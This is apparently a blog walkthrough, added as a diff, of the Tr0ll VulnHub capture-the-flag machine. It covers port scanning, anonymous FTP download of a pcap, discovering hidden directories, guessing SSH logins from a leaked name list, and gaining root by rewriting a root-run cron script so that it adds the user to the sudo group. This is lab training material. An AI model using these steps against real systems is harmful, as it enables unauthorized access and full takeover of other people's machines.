@@ -1,0 +1,271 @@
+<p>This is a walkthrough of the VM Tr0ll. That can be found on <a href="https://www.vulnhub.com/entry/tr0ll-1,100/">vulnhub</a>.</p>
+<p>Let's fire up Virtualbox and boot up the VM.</p>
+<h2>Mapping</h2>
+<p>Let's start by scanning the network to find our server.<br />
+[code]<br />
+nmap 192.168.1.0/24<br />
+[/code]</p>
+<p>[code]<br />
+Nmap scan report for 192.168.1.107<br />
+Host is up (0.0067s latency).<br />
+Not shown: 997 closed ports<br />
+PORT   STATE SERVICE<br />
+21/tcp open  ftp<br />
+22/tcp open  ssh<br />
+80/tcp open  http<br />
+[/code]</p>
+<p>I usually map the machine to a fake-domain address so that Burp Suite will work.</p>
+<p>[code]<br />
+sudo vim /etc/hosts<br />
+192.168.1.107   troll.dev<br />
+[/code]</p>
+<p>Okay, so we have three ports showing, after an initial scan. Let's try all the ports. To make sure we are not missing anything.<br />
+The A-flag stands for aggressive. This flag is a combination of -O (OS-detection), -sV (version scanning), -sC (script scanning), and --traceroute.<br />
+-p- means that we will check all 65532 ports.</p>
+<p>[code]<br />
+nmap -A -p- 192.168.1.107</p>
+<p>#Output<br />
+Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-11 21:02 CLST<br />
+Nmap scan report for troll.dev (192.168.1.107)<br />
+Host is up (0.0070s latency).<br />
+Not shown: 65532 closed ports<br />
+PORT   STATE SERVICE VERSION<br />
+21/tcp open  ftp     vsftpd 3.0.2<br />
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />
+|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]<br />
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br />
+| ssh-hostkey:<br />
+|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)<br />
+|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)<br />
+|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)<br />
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br />
+| http-robots.txt: 1 disallowed entry<br />
+|_/secret<br />
+|_http-server-header: Apache/2.4.7 (Ubuntu)<br />
+|_http-title: Site doesn't have a title (text/html).<br />
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br />
+[/code]</p>
+<h3>FTP</h3>
+<p>Okay, so we can see that the server is using vsftpd version 3.0.2. Vsftpd is the default ftp-server in many linux-systems. This configuration appears to allow anonymous logins. Which is why we are able to retrieve the file listing of the root directory just by scanning it. So we can see that there is a file called lol.pcap. We will get to this later.</p>
+<h3>SSH</h3>
+<p>We can also see that port 22 is open, the standard port for SSH. The version seems to be 6.6.1p1, which is not the latest. Then we can see the host-key of ssh.</p>
+<h3>HTTP</h3>
+<p>Okay so it seems port 80 is open. And it runs Apache 2.4.7, on Ubuntu.<br />
+It has a robots.txt file, which might be worth checking out.</p>
+<p>Okay, so we have two interesting leads here. We have the file lol.pcap on the ftp-server, and we have port 80. So let's check out the web.<br />
+The index-page just gives us a troll-image. I download it and investigate the meta-data of the image. But I find nothing interesting.</p>
+<p>[code]<br />
+wget http://troll.dev/hacker.jpg<br />
+exiftool hacker.jpg<br />
+[/code]</p>
+<p>Let's check out the robots file.<br />
+[code]<br />
+User-agent:*<br />
+Disallow: /secret<br />
+[/code]</p>
+<p>It leads us to secret. But that is just another troll image, and with no interesting meta-data.</p>
+<h2>lol.pcap</h2>
+<p>We log in with the user anonymous and don't need to provide a password.</p>
+<p>[code]<br />
+ftp 192.168.1.107<br />
+Connected to 192.168.1.107.<br />
+220 (vsFTPd 3.0.2)<br />
+Name (192.168.1.107:comp): anonymous<br />
+331 Please specify the password.<br />
+Password:<br />
+230 Login successful.<br />
+Remote system type is UNIX.<br />
+Using binary mode to transfer files.<br />
+ftp&gt; ls<br />
+200 PORT command successful. Consider using PASV.<br />
+150 Here comes the directory listing.<br />
+-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap<br />
+226 Directory send OK.<br />
+ftp&gt; get lol.pcap<br />
+local: lol.pcap remote: lol.pcap<br />
+200 PORT command successful. Consider using PASV.<br />
+150 Opening BINARY mode data connection for lol.pcap (8068 bytes).<br />
+226 Transfer complete.<br />
+8068 bytes received in 0.00 secs (92693.0 kB/s)<br />
+[/code]</p>
+<p>Okay. So now we have the .pcap file on the computer. But what is a pcap file?<br />
+Pcap stands for "Package Capture". Which means that it is a file filled with packages that has been captured and saved in the file. So we are able to analyze network packages after they have been sent. So in order to make any sense of this file we need a program to open it with. Wireshark is popular to use. But I don't have it on this computer, so instead I use tcpick. Tcpick is just like wireshark, a tcp stream sniffer.</p>
+<p>We run the following command. C stands for color. -yP for viewing package in printable characters. and -r to read a file.<br />
+[code]<br />
+tcpick -C -yP -r lol.pcap<br />
+[/code]</p>
+<p>Here is the output:</p>
+<p>[code]<br />
+tcpick: reading from lol.pcap<br />
+1      SYN-SENT       10.0.0.12:52449 &gt; 10.0.0.6:ftp<br />
+1      SYN-RECEIVED   10.0.0.12:52449 &gt; 10.0.0.6:ftp<br />
+1      ESTABLISHED    10.0.0.12:52449 &gt; 10.0.0.6:ftp<br />
+220 (vsFTPd 3.0.2)<br />
+USER anonymous<br />
+331 Please specify the password.<br />
+PASS password<br />
+230 Login successful.<br />
+SYST<br />
+215 UNIX Type: L8<br />
+PORT 10,0,0,12,173,198<br />
+200 PORT command successful. Consider using PASV.<br />
+LIST<br />
+2      SYN-SENT       10.0.0.6:ftp-data &gt; 10.0.0.12:44486<br />
+2      SYN-RECEIVED   10.0.0.6:ftp-data &gt; 10.0.0.12:44486<br />
+2      ESTABLISHED    10.0.0.6:ftp-data &gt; 10.0.0.12:44486<br />
+150 Here comes the directory listing.<br />
+-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt<br />
+2      FIN-WAIT-1     10.0.0.6:ftp-data &gt; 10.0.0.12:44486<br />
+2      FIN-WAIT-2     10.0.0.6:ftp-data &gt; 10.0.0.12:44486<br />
+2      TIME-WAIT      10.0.0.6:ftp-data &gt; 10.0.0.12:44486<br />
+2      CLOSED         10.0.0.6:ftp-data &gt; 10.0.0.12:44486<br />
+226 Directory send OK.<br />
+TYPE I<br />
+200 Switching to Binary mode.<br />
+PORT 10,0,0,12,202,172<br />
+200 PORT command successful. Consider using PASV.<br />
+RETR secret_stuff.txt<br />
+3      SYN-SENT       10.0.0.6:ftp-data &gt; 10.0.0.12:51884<br />
+3      SYN-RECEIVED   10.0.0.6:ftp-data &gt; 10.0.0.12:51884<br />
+3      ESTABLISHED    10.0.0.6:ftp-data &gt; 10.0.0.12:51884<br />
+150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).<br />
+Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</p>
+<p>Sucks, you were so close... gotta TRY HARDER!<br />
+3      FIN-WAIT-1     10.0.0.6:ftp-data &gt; 10.0.0.12:51884<br />
+3      TIME-WAIT      10.0.0.6:ftp-data &gt; 10.0.0.12:51884<br />
+3      CLOSED         10.0.0.6:ftp-data &gt; 10.0.0.12:51884<br />
+226 Transfer complete.<br />
+TYPE A<br />
+200 Switching to ASCII mode.<br />
+PORT 10,0,0,12,172,74<br />
+200 PORT command successful. Consider using PASV.<br />
+LIST<br />
+4      SYN-SENT       10.0.0.6:ftp-data &gt; 10.0.0.12:44106<br />
+4      SYN-RECEIVED   10.0.0.6:ftp-data &gt; 10.0.0.12:44106<br />
+4      ESTABLISHED    10.0.0.6:ftp-data &gt; 10.0.0.12:44106<br />
+150 Here comes the directory listing.<br />
+-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt<br />
+4      FIN-WAIT-1     10.0.0.6:ftp-data &gt; 10.0.0.12:44106<br />
+4      TIME-WAIT      10.0.0.6:ftp-data &gt; 10.0.0.12:44106<br />
+4      CLOSED         10.0.0.6:ftp-data &gt; 10.0.0.12:44106<br />
+226 Directory send OK.<br />
+QUIT<br />
+221 Goodbye.<br />
+1      FIN-WAIT-1     10.0.0.12:52449 &gt; 10.0.0.6:ftp<br />
+1      TIME-WAIT      10.0.0.12:52449 &gt; 10.0.0.6:ftp<br />
+1      CLOSED         10.0.0.12:52449 &gt; 10.0.0.6:ftp<br />
+tcpick: done reading from lol.pcap</p>
+<p>67 packets captured<br />
+4 tcp sessions detected<br />
+[/code]</p>
+<p>So we can see here that someone has logged in as anonymous.<br />
+And listed all the files in a directory, and it contains the mysterous file secret_stuff.txt.<br />
+It also contains a little message from our troll that talks about a supersecretdir.<br />
+[code]<br />
+-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt<br />
+Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P<br />
+[/code]</p>
+<p>Okay, so a supersecret directory. Let's check it out in the browser.</p>
+<p>Okay, is shows us a directory with a file called roflmao. Let's download it.</p>
+<p>[code]<br />
+$ file roflmao<br />
+roflmao: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped<br />
+[/code]</p>
+<p>Okay. So it is an executable. Let's execute it then<br />
+[code]<br />
+chmod +x roflmao<br />
+./roflmao<br />
+#It returns<br />
+Find address 0x0856BF to proceed%<br />
+[/code]<br />
+It looks like a hexadecimal value. But where to use it?<br />
+I convert it to decimals using python<br />
+[code lang="python"]<br />
+print int(&quot;0x0856BF&quot;, 16)<br />
+#Output:<br />
+546495<br />
+[/code]</p>
+<p>That number does't really say me anything.</p>
+<p>Okay, so I try both decimal and hexadecimal numbers in the browser. http://troll.dev/0x0856BF/ leads me to a directory with a text of what I suppose is passwords.<br />
+http://troll.dev/0x0856BF/good_luck/which_one_lol.txt</p>
+<pre>
+maleus
+ps-aux
+felux
+Eagle11
+genphlux &lt; -- Definitely not this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+</pre>
+<p>It could be passwords, or usernames. In the other folder there is a dir called: his_folder_contains_the_password/ with the file Pass.txt in it.</p>
+<p>I figure the next step must be ssh. So after trying many different combinations, which was made harder by the fact that the server has some kind of fail2ban mechanism installed, I figured the username was overflow and the password was Pass.txt.</p>
+<p>Okay. So we get a shell, but it is a pretty crappy one so I just write bash and it gives me a bash-shell. Great!</p>
+<h2>Enumeration and Privilege Escalation</h2>
+<p>Okay, so we have a shell and we are in. But after a few minutes we are kicked out. I guess there is a cronjob doing it.<br />
+Let's see what other users we have.</p>
+<p>[code]<br />
+sudo -v<br />
+Sorry, user overflow may not run sudo on troll.</p>
+<p>cat /etc/passwd<br />
+troll:x:1000:1000:Tr0ll,,,:/home/troll:/bin/bash<br />
+lololol:x:1001:1001::/home/lololol:<br />
+overflow:x:1002:1002::/home/overflow:<br />
+ps-aux:x:1003:1003::/home/ps-aux:<br />
+maleus:x:1004:1004::/home/maleus:<br />
+felux:x:1005:1005::/home/felux:<br />
+Eagle11:x:1006:1006::/home/Eagle11:<br />
+genphlux:x:1007:1007::/home/genphlux:<br />
+usmc8892:x:1008:1008::/home/usmc8892:<br />
+blawrg:x:1009:1009::/home/blawrg:<br />
+wytshadow:x:1010:1010::/home/wytshadow:<br />
+vis1t0r:x:1011:1011::/home/vis1t0r:<br />
+[/code]<br />
+I have removed all users that are root and system-users. So we are left with 12 users. All part of their own groups.<br />
+I can't find out if any of them are sudo users because I don't have permission to view /etc/sudoers. We can also tell that the passwords are encrypted and in the shadow file, that we don't have access to.</p>
+<p>Let's look<br />
+[code]<br />
+$ find / -writable -type d 2&gt;/dev/null<br />
+/tmp<br />
+/run/user/1002<br />
+/run/shm<br />
+/run/lock<br />
+/var/tmp<br />
+/sys/fs/cgroup/systemd/user/1002.user/10.session<br />
+/proc/4981/task/4981/fd<br />
+/proc/4981/fd<br />
+/proc/4981/map_files<br />
+[/code]<br />
+Let's see what in /var/tmp.<br />
+[code]<br />
+overflow@troll:/tmp$ cd /var/tmp<br />
+overflow@troll:/var/tmp$ ls<br />
+cleaner.py.swp<br />
+overflow@troll:/var/tmp$ cat cleaner.py.swp<br />
+crontab for cleaner.py successful</p>
+<p>overflow@troll:/var/tmp$ find / -iname cleaner.py 2&gt;/dev/null<br />
+/lib/log/cleaner.py</p>
+<p>overflow@troll:/lib/log$ cat cleaner.py<br />
+#!/usr/bin/env python<br />
+import os<br />
+import sys<br />
+try:<br />
+	os.system('rm -r /tmp/* ')<br />
+except:<br />
+	sys.exit()<br />
+overflow@troll:/lib/log$<br />
+[/code]</p>
+<p>I ran a few other commands as well looking for setuid files. Those commands can be found on <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">this amazing page</a>.</p>
+<p>Okay, so we have a file that is owned by root and run as a cron every time I get kicked out. So maybe I can just make myself sudo.<br />
+[code lang="python"]<br />
+import os<br />
+os.system(&quot;sudo usermod -aG sudo overflow&quot;)<br />
+[/code]<br />
+Now I just wait for the cronjob to kick me out and run the code.<br />
+So I get kicked out and then I just run:<br />
+[code]<br />
+sudo su<br />
+[/code]<br />
+And I am root.</p>
